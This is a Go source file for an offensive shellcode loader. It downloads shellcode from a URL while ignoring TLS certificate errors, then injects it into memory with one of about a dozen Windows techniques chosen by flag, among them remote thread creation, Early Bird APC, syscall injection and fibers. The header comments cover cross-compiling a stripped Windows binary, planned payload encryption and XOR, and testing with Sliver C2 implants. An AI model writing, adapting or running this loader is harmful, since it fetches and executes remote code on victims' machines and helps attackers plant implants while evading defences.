package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"meminject"
	"net/http"
	"os"
)

/*
Purpose:
Combine from go-shellcode project various methods to inject into memory
Create the project to allow the selection of which method fo injection
Create the project to allow the dynamic pull from a URL the shellcode (For PoC use a command line switch, future is to create a prompt...)

Future:
In the go-shellcode is shellutils - Extend this to encrypt, XOR, or ... the payload that is sitting in a raw format on the webserver...
(To decrypt flags or prompting to decrypt with the specific keys, etc.)
Verify that it works with Sliver shellcode download...

Setup the Environment

go env -w GOROOT="/usr/lib/go"
go env -w GOPATH="/home/thepcn3rd/go/workspaces/memoryInjection/"

Make the directories - src
Copy the commonFunctions folder into the src directory so that it can be referenced

go get -u golang.org/x/sys/...
go install golang.org/x/sys/...@latest - Had to do this on an ubuntu box

# For the UUID technique the below is needed...
go get github.com/google/uuid/
go get github.com/fatih/color
go get golang.org/x/crypto/argon2

NOTE: go run main.go does not work, you need to compile it to windows and then move it over and it will work...

// To compile for windows
GOOS=windows GOARCH=amd64 go build -o meminjector.exe -ldflags "-w -s" main.go


Code forked from the following github repo: https://github.com/thepcn3rd/go-shellcode/tree/master


*/

func main() {
	verbose := flag.Bool("verbose", false, "Enable verbose output")
	debug := flag.Bool("debug", false, "Enable debug output")
	url := flag.String("url", "", "URL to download shellcode")
	createFiber := flag.Bool("createfiber", false, "Use the Create Fiber Technique")

	createProcess := flag.Bool("createprocess", false, "Use the Create Process Technique to inject shellcode into memory")
	program := flag.String("program", "C:\\Windows\\System32\\notepad.exe", "Program to Launch to then inject in (Required for Create Process and Create Process with Pipe)")
	args := flag.String("args", "", "Arguments to send with the program launching (Optional for Create Process and Create Process with Pipe)")

	createProcesswithPipe := flag.Bool("createprocesswithpipe", false, "Use the Create Process with Pipe technique to inject shellcode into memory")

	createRemoteThread := flag.Bool("createremotethread", false, "Use the Create Remote Thread technique to inject shellcode into memory. Note: Appropriate user privileges are required")
	pid := flag.Int("pid", 9999, "Use to target process (Required for Create Remote Thread and Create Remote Thread Native)")

	createRemoteThreadNative := flag.Bool("createremotethreadnative", false, "Use the Create Remote Thread Native technique to inject shellcode into memory. Note: Appropriate user privileges are required")

	createThread := flag.Bool("createthread", false, "Use the Create Thread technique to inject shellcode into memory.")

	createThreadNative := flag.Bool("createthreadnative", false, "Use the Create Thread Native technique to inject shellcode into memory.")

	earlyBird := flag.Bool("earlybird", false, "Use the Early Bird method to inject into a process")

	enumeratedLoadedModules := flag.Bool("enumloadedmodules", false, "Use the enumerated loaded modules, unreliable, may load the shellcode multiple times")

	etwpCreateEtwThread := flag.Bool("etwpcreateetwthread", false, "Use the ETWP Create ETW Thread")

	ntQueueApcThreadEx := flag.Bool("ntqueueapcthreadex", false, "Use the NT Queue APC Thread Ex Technique")

	rtlCreateUserThread := flag.Bool("rtlcreateuserthread", false, "Use the RTL Create User Thread Technique, requires a PID to be specified")

	sysCallInjection := flag.Bool("syscall", false, "Use the syscall technique")

	//uuidFromString := flag.Bool("uuidfromstring", false, "Use the UUID From String Technique")
	flag.Parse()

	if *url == "" {
		fmt.Println("Specify the url of where to download the shellcode")
		flag.Usage()
		os.Exit(0)
	}

	// Ignore the SSL Certificate if it is self-signed...
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{Transport: transport}
	resp, err := client.Get(*url)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	var shellcode []byte
	buf := make([]byte, 1024)
	for {
		n, err := resp.Body.Read(buf)
		if err == io.EOF {
			break
		}
		if err != nil {
			panic(err)
		}
		shellcode = append(shellcode, buf[:n]...)
	}
	if *createFiber == true {
		meminject.Createfiber(*debug, *verbose, shellcode)
	} else if *createProcess == true {
		fmt.Printf("Creating a process with the prog: %s\n", *program)
		meminject.Createprocess(*debug, *verbose, shellcode, *program, *args)
	} else if *createProcesswithPipe == true {
		fmt.Printf("Creating a process with the prog: %s\n", *program)
		meminject.Createprocesswithpipe(*debug, *verbose, shellcode, *program, *args)
	} else if *createRemoteThread == true {
		fmt.Printf("Using the following process ID: %d  Injecting...\n", *pid)
		meminject.Createremotethread(*debug, *verbose, shellcode, *pid)
	} else if *createRemoteThreadNative == true {
		fmt.Printf("Using the following process ID: %d  Injecting...\n", *pid)
		meminject.Createremotethread(*debug, *verbose, shellcode, *pid)
	} else if *createThread == true {
		meminject.Createthread(*debug, *verbose, shellcode)
	} else if *createThreadNative == true {
		meminject.Createthreadnative(*debug, *verbose, shellcode)
	} else if *earlyBird == true {
		fmt.Printf("Creating a process with the prog: %s\n", *program)
		meminject.Earlybird(*debug, *verbose, shellcode, *program, *args)
	} else if *enumeratedLoadedModules == true {
		meminject.Enumerateloadedmodules(*debug, *verbose, shellcode)
	} else if *etwpCreateEtwThread == true {
		meminject.Etwpcreateetwthread(*debug, *verbose, shellcode)
	} else if *ntQueueApcThreadEx == true {
		meminject.Ntqueueapcthreadex(*debug, *verbose, shellcode)
	} else if *rtlCreateUserThread == true {
		fmt.Printf("Using the following process ID: %d  Injecting...\n", *pid)
		meminject.Rtlcreateuserthread(*debug, *verbose, shellcode, *pid)
	} else if *sysCallInjection == true {
		meminject.SyscallInjection(*debug, *verbose, shellcode)
		//} else if *uuidFromString == true {
		//	meminject.Uuidfromstring(*debug, *verbose, shellcode)
	} else {
		fmt.Println("Select a technique to use...")
		os.Exit(0)
	}
}
